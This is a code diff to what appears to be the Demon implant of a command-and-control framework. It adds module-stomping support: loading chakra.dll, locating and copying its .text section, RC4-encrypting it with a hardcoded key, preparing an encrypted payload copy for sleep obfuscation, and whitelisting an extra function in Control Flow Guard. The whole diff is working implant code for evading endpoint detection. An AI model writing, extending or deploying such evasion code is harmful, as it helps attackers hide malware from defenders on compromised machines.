@@ -18,9 +18,25 @@
 /* Import Inject Headers */
 #include <Loader/ObjectApi.h>
 
+#define TEXTSTRINGSIZE 6
+
 /* Global Variables */
 SEC_DATA INSTANCE Instance      = { 0 };
 SEC_DATA BYTE     AgentConfig[] = CONFIG_BYTES;
+
+BOOL IsText(PIMAGE_SECTION_HEADER SecHeader){
+    //todo add hideChar thing
+    PCHAR name = SecHeader->Name;
+    CHAR text[TEXTSTRINGSIZE] = {'.','t','e','x','t','\0'};
+    BOOL res = TRUE;
+    for(int i=0;i< TEXTSTRINGSIZE;i++){
+        if(text[i] != name[i]){
+            res = FALSE;
+            break;
+        }
+    }
+    return res;
+}
 
 /*
  * In DemonMain it should go as followed:
@@ -392,6 +408,7 @@ VOID DemonInit( PVOID ModuleInst, PKAYN_ARGS KArgs )
     /* load kernel32.dll functions */
     if ( ( Instance.Modules.Kernel32 = LdrModulePeb( H_MODULE_KERNEL32 ) ) ) {
         Instance.Win32.LoadLibraryW                    = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_LOADLIBRARYW );
+        Instance.Win32.LoadLibraryExW                  = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_LOADLIBRARYEXW );
         Instance.Win32.VirtualProtectEx                = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_VIRTUALPROTECTEX );
         Instance.Win32.VirtualProtect                  = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_VIRTUALPROTECT );
         Instance.Win32.LocalAlloc                      = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_LOCALALLOC );
@@ -481,14 +498,62 @@ VOID DemonInit( PVOID ModuleInst, PKAYN_ARGS KArgs )
         }
     }
 
+    //TODO: START. remove for testing
+    PVOID Module = Instance.Win32.LoadLibraryExW(L"chakra.dll",NULL,DONT_RESOLVE_DLL_REFERENCES);
+    PIMAGE_NT_HEADERS NtHeaders = C_PTR(Module + ((PIMAGE_DOS_HEADER) Module)->e_lfanew);
+    PIMAGE_SECTION_HEADER SecHeader = IMAGE_FIRST_SECTION(NtHeaders);
+    LPVOID KVirtualMemory = NULL;
+    SIZE_T SecMemorySize = 0;
+    SIZE_T StompedSize = 0;
+    for (DWORD i = 0; i < NtHeaders->FileHeader.NumberOfSections; i++) {
+        //SecMemory = C_PTR( ModuleStomped + SecHeader[ i ].VirtualAddress );
+        if (IsText(&SecHeader[i])) {
+            KVirtualMemory = C_PTR(Module + SecHeader[i].VirtualAddress);
+            SecMemorySize = SecHeader[i].SizeOfRawData;
+            StompedSize = SecMemorySize + KEYSIZE;
+            break;
+        }
+    }
+    PVOID StompedAddress = NULL;
+    SIZE_T tmp = StompedSize;
+    Instance.Win32.NtAllocateVirtualMemory(NtCurrentProcess(),&StompedAddress,0,&tmp,MEM_COMMIT,PAGE_READWRITE);
+    PBYTE DestPtr = (PBYTE)StompedAddress + KEYSIZE;
+    PBYTE SrcPtr = KVirtualMemory;
+    MemCopy(DestPtr,SrcPtr,StompedSize-KEYSIZE);
+    Instance.Session.Rc4StompedModule.Buffer = DestPtr;
+    Instance.Session.Rc4StompedModule.Length = StompedSize-KEYSIZE;
+    Instance.Session.Rc4StompedModule.MaximumLength = StompedSize-KEYSIZE;
+    Instance.Session.KeyStompedModule.Buffer = DestPtr - KEYSIZE;
+    Instance.Session.KeyStompedModule.Length = KEYSIZE;
+    Instance.Session.KeyStompedModule.MaximumLength = KEYSIZE;
+    PBYTE ptr = Instance.Session.KeyStompedModule.Buffer;
+    for(int i=0;i<KEYSIZE;i++){
+        ptr[i] = 0xa+i;
+    }
+    Instance.Win32.SystemFunction032(&(Instance.Session.Rc4StompedModule),&(Instance.Session.KeyStompedModule));
+    //TODO: END. remove for testing
+
     if ( KArgs )
     {
+        //if demon is stomping a module
+        if(KArgs->KeyStompedModule.Buffer != NULL && KArgs->Rc4StompedModule.Buffer != NULL) {
+            //Set Key for Rc4-encrypted stomped module
+            Instance.Session.KeyStompedModule.Length = KArgs->KeyStompedModule.Length;
+            Instance.Session.KeyStompedModule.MaximumLength = KArgs->KeyStompedModule.MaximumLength;
+            Instance.Session.KeyStompedModule.Buffer = KArgs->KeyStompedModule.Buffer;
+
+            //Set Rc4-encrypted stomped module
+            Instance.Session.Rc4StompedModule.Length = KArgs->Rc4StompedModule.Length;
+            Instance.Session.Rc4StompedModule.MaximumLength = KArgs->Rc4StompedModule.MaximumLength;
+            Instance.Session.Rc4StompedModule.Buffer = KArgs->Rc4StompedModule.Buffer;
+        }
 #if SHELLCODE
         Instance.Session.ModuleBase = KArgs->Demon;
         Instance.Session.ModuleSize = KArgs->DemonSize;
         Instance.Session.TxtBase = KArgs->TxtBase;
         Instance.Session.TxtSize = KArgs->TxtSize;
-        FreeReflectiveLoader( KArgs->KaynLdr );
+        //FreeReflectiveLoader( KArgs->KaynLdr );
+
 #endif
     }
     else
@@ -505,7 +570,15 @@ VOID DemonInit( PVOID ModuleInst, PKAYN_ARGS KArgs )
             Instance.Session.ModuleSize = IMAGE_SIZE( Instance.Session.ModuleBase );
         }
     }
-
+    if(Instance.Session.Rc4StompedModule.Buffer != NULL) {
+        //creating encrypted copy of payload later useful during sleep obf for module stomping
+        SIZE_T PayloadSize = Instance.Session.ModuleSize + KEYSIZE;
+        ptr = NtHeapAlloc(PayloadSize);
+        Instance.Session.Rc4PayloadModule.Buffer = ptr + KEYSIZE;
+        Instance.Session.Rc4PayloadModule.Length = Instance.Session.Rc4PayloadModule.MaximumLength = PayloadSize - KEYSIZE;
+        Instance.Session.KeyPayloadModule.Buffer = ptr;
+        Instance.Session.KeyPayloadModule.Length = Instance.Session.KeyPayloadModule.MaximumLength = KEYSIZE;
+    }
 #if _WIN64
     Instance.Session.OS_Arch      = PROCESSOR_ARCHITECTURE_AMD64;
     Instance.Session.Process_Arch = PROCESSOR_ARCHITECTURE_AMD64;
@@ -550,6 +623,7 @@ VOID DemonInit( PVOID ModuleInst, PKAYN_ARGS KArgs )
         CfgAddressAdd( Instance.Modules.Ntdll,    Instance.Win32.NtSetContextThread );
         CfgAddressAdd( Instance.Modules.Ntdll,    Instance.Win32.NtGetContextThread );
         CfgAddressAdd( Instance.Modules.Advapi32, Instance.Win32.SystemFunction032 );
+        CfgAddressAdd( Instance.Modules.Advapi32, Instance.Win32.RtlCopyMappedMemory );
 
         /* ekko sleep obf */
         CfgAddressAdd( Instance.Modules.Kernel32, Instance.Win32.WaitForSingleObjectEx );
